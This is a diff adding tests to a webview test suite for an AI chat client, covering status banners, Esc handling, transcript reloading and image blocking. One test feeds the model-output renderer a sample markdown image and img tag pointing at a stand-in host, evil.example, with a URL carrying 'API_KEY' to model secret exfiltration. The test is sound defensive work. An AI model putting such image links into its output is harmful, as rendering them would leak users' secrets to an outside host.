@@ -302,6 +302,73 @@ describe("webview", { concurrency: false }, () => {
     await done(h);
   });
 
+  it("status banner appears and disappears (starting → ready → stopped → restart)", async () => {
+    const h = await harness();
+    const visible = () => h.page.$eval("#banner", (b) => getComputedStyle(b).display !== "none");
+    await h.post({ type: "status", status: "starting" });
+    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("Starting"));
+    assert.equal(await visible(), true);
+    await h.post({ type: "status", status: "ready" });
+    await h.page.waitForFunction(() => getComputedStyle(document.getElementById("banner")).display === "none");
+    await h.post({ type: "status", status: "ready", needsKey: true });
+    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("API key"));
+    await h.page.click("#banner .linkbtn");
+    await h.waitFor((m) => m.type === "setApiKey");
+    await h.post({ type: "status", status: "stopped", message: "tai stopped (exit code 1).", canRestart: true });
+    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("exit code 1"));
+    assert.equal(await visible(), true);
+    await h.page.click("#banner .linkbtn");
+    await h.waitFor((m) => m.type === "restart");
+    await h.post({ type: "status", status: "ready" });
+    await h.page.waitForFunction(() => getComputedStyle(document.getElementById("banner")).display === "none");
+    for (const sel of ["#menu", "#thinking", "#toast"]) {
+      assert.equal(await h.page.$eval(sel, (e) => getComputedStyle(e).display), "none", sel + " hidden when idle");
+    }
+    await done(h);
+  });
+
+  it("Esc closes the @ menu without stopping tai", async () => {
+    const h = await harness();
+    await h.sendText(mock({ text: "working", hang: 30 }));
+    await h.page.waitForFunction(() => document.querySelector(".msg.assistant")?.textContent.includes("working"));
+    await h.type("look @");
+    await h.waitSel("#menu:not([hidden])");
+    await h.page.keyboard.press("Escape");
+    await new Promise((r) => setTimeout(r, 300));
+    assert.equal(h.toHost.filter((m) => m.type === "cancel").length, 0);
+    assert.equal(await h.page.$eval("#thinking", (t) => t.hidden), false);
+    await h.page.keyboard.press("Escape");
+    await h.waitIdle();
+    assert.equal(h.toHost.filter((m) => m.type === "cancel").length, 1, "one Esc, one cancel");
+    await done(h);
+  });
+
+  it("does not load remote images from model output", async () => {
+    const h = await harness();
+    const reqs = [];
+    h.page.on("request", (r) => reqs.push(r.url()));
+    await h.sendText(mock({ text: "![secret](https://evil.example/leak?d=API_KEY) and <img src=\"https://evil.example/x.png\">" }));
+    await h.waitIdle();
+    assert.equal(await h.page.$(".msg.assistant img"), null);
+    assert.match((await h.text(".msg.assistant a"))[0], /\[image: secret\]/);
+    assert.ok(!reqs.some((u) => u.includes("evil.example")), reqs.join(","));
+    await done(h);
+  });
+
+  it("a transcript loaded mid-turn keeps streaming into the same reply", async () => {
+    const h = await harness();
+    await h.sendText(mock({ text: "first half", hang: 2 }));
+    await h.page.waitForFunction(() => document.querySelector(".msg.assistant")?.textContent.includes("first half"));
+    const t = await h.client.call("transcript");
+    h.post({ type: "transcript", items: t.transcript, state: t.state });
+    await h.page.waitForFunction(() => document.querySelectorAll(".msg.assistant").length === 1 &&
+      document.querySelector(".msg.assistant").textContent.includes("first half"));
+    assert.equal(await h.page.$eval("#thinking", (x) => x.hidden), false);
+    await h.waitIdle();
+    assert.equal((await h.page.$$(".msg.assistant")).length, 1);
+    await done(h);
+  });
+
   it("streams a long answer without errors", async () => {
     const h = await harness();
     const long = Array.from({ length: 400 }, (_, i) => `Line ${i} with \`code\` and **bold** text.`).join("\n\n");
